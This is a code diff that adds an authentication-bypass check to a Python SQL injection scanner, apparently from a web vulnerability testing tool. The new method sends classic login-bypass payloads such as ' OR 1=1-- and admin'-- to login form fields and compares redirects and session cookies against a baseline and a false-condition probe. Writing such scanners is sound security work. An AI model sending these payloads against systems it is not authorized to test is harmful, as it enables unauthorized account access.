@@ -119,6 +119,16 @@ class SQLiDetector:
         async def test_one(inj_target: InjectionTarget) -> list[dict[str, Any]]:
             res: list[dict[str, Any]] = []
             async with sem:
+                # 0. Form-based Authentication Bypass Detection
+                if inj_target.target_type == "form" and any(
+                    kw in inj_target.param_name.lower()
+                    for kw in ("user", "login", "uname", "email", "account", "tbuser", "tfu", "name")
+                ):
+                    auth_finding = await self._test_auth_bypass(inj_target, inj_target.param_name)
+                    if auth_finding:
+                        res.append(auth_finding)
+                        return res
+
                 # 1. Error-based detection
                 error_finding = await self._test_error_based(
                     inj_target, inj_target.param_name, inj_target.original_value
@@ -148,6 +158,131 @@ class SQLiDetector:
                 findings.extend(r)
 
         return findings
+
+    # ── Authentication Bypass Detection ───────────────────────────────────────
+
+    async def _test_auth_bypass(
+        self, target: InjectionTarget, param: str
+    ) -> Optional[dict[str, Any]]:
+        """Test for form-based SQL injection authentication bypass."""
+        # Baseline with invalid dummy credentials
+        b_resp = await self._send_request(
+            target, param, "invalid_probe_user_9876", timeout_seconds=8, allow_redirects=False
+        )
+        if b_resp is None:
+            return None
+        b_status = b_resp["status"]
+        b_headers = b_resp.get("headers") or {}
+        b_location = b_headers.get("location", "")
+        b_cookies = b_headers.get("set-cookie", "")
+
+        # If baseline redirected, baseline itself is not a stable login prompt
+        if b_status in (301, 302, 303, 307, 308):
+            return None
+
+        bypass_payloads = [
+            "' OR 1=1-- ",
+            "' OR '1'='1'-- ",
+            "admin'-- ",
+            "' OR '1'='1",
+            "\" OR 1=1-- ",
+            "' OR 1=1#",
+        ]
+
+        for payload in bypass_payloads:
+            resp = await self._send_request(
+                target, param, payload, timeout_seconds=8, allow_redirects=False
+            )
+            if resp is None:
+                continue
+
+            if is_waf_block_page(resp["body"], resp["status"], resp.get("headers")):
+                continue
+
+            r_status = resp["status"]
+            r_headers = resp.get("headers") or {}
+            r_location = r_headers.get("location", "")
+            r_cookies = r_headers.get("set-cookie", "")
+
+            # Check for Auth Bypass indicators:
+            # 1. 302/301/303 redirect away from login page
+            redirect_bypass = (
+                r_status in (301, 302, 303, 307, 308)
+                and b_status == 200
+                and r_location != b_location
+            )
+            # 2. Session / Auth cookie issued that was absent in baseline
+            cookie_bypass = (
+                bool(r_cookies)
+                and r_cookies != b_cookies
+                and any(
+                    kw in r_cookies.lower()
+                    for kw in ("login", "auth", "session", "user", "token", "ticket")
+                )
+            )
+
+            if not (redirect_bypass or cookie_bypass):
+                continue
+
+            # ── Condition B: Negative Verification with False Payload ──
+            false_resp = await self._send_request(
+                target, param, "' AND 1=2-- ", timeout_seconds=8, allow_redirects=False
+            )
+            if false_resp is None:
+                continue
+            false_status = false_resp["status"]
+            false_headers = false_resp.get("headers") or {}
+            false_location = false_headers.get("location", "")
+            false_cookies = false_headers.get("set-cookie", "")
+
+            # Negative condition must fail to log in
+            if false_status in (301, 302, 303) and false_location == r_location:
+                continue
+            if false_cookies and false_cookies == r_cookies:
+                continue
+
+            # ── Condition C: Mandatory Reproduction Round ──
+            repro = await self._send_request(
+                target, param, payload, timeout_seconds=8, allow_redirects=False
+            )
+            if repro is None:
+                continue
+            repro_status = repro["status"]
+            repro_headers = repro.get("headers") or {}
+            repro_cookies = repro_headers.get("set-cookie", "")
+
+            if repro_status != r_status and not (repro_cookies and cookie_bypass):
+                continue
+
+            return {
+                "id": "SQLI-AUTH-BYPASS",
+                "title": f"SQL Injection (Authentication Bypass): Parameter '{param}'",
+                "severity": "critical",
+                "confidence": "high",
+                "category": "injection",
+                "target": target.url,
+                "verification_method": "baseline_differential",
+                "evidence": (
+                    f"Parameter: {param}\n"
+                    f"Target Form URL: {target.url} [POST]\n"
+                    f"Payload: {payload}\n"
+                    f"Baseline (invalid user): HTTP {b_status} (login form displayed, no redirect)\n"
+                    f"Payload response: HTTP {r_status} "
+                    + (f"-> Redirect to '{r_location}'\n" if r_location else "\n")
+                    + (f"Set-Cookie: {r_cookies[:120]}...\n" if r_cookies else "")
+                    + f"Negative verification (' AND 1=2-- ): HTTP {false_status} (denied access, matched baseline)\n"
+                    f"Result: Database authentication logic completely bypassed via SQL injection."
+                ),
+                "recommendation": (
+                    "Use parameterized queries / prepared statements for authentication queries. "
+                    "Never concatenate user input directly into SQL statements. CWE-89, OWASP A03:2021."
+                ),
+                "references": ["https://cwe.mitre.org/data/definitions/89.html"],
+                "cwe": "CWE-89",
+                "owasp_category": "A03:2021-Injection",
+            }
+
+        return None
 
     # ── Error-Based Detection ─────────────────────────────────────────────────
 
@@ -496,6 +631,7 @@ class SQLiDetector:
         param: str,
         value: str,
         timeout_seconds: float = 10,
+        allow_redirects: bool = True,
     ) -> Optional[dict[str, Any]]:
         """Send a GET or POST request with param=value and return a response dict."""
         import aiohttp as _aiohttp
@@ -512,6 +648,7 @@ class SQLiDetector:
                         data=form_data,
                         retries=1,
                         timeout=_aiohttp.ClientTimeout(total=timeout_seconds),
+                        allow_redirects=allow_redirects,
                     )
                 else:
                     query_params = dict(target.all_params)
@@ -521,6 +658,7 @@ class SQLiDetector:
                         params=query_params,
                         retries=1,
                         timeout=_aiohttp.ClientTimeout(total=timeout_seconds),
+                        allow_redirects=allow_redirects,
                     )
             else:
                 url = target
@@ -529,6 +667,7 @@ class SQLiDetector:
                     params={param: value},
                     retries=1,
                     timeout=_aiohttp.ClientTimeout(total=timeout_seconds),
+                    allow_redirects=allow_redirects,
                 )
 
             return {
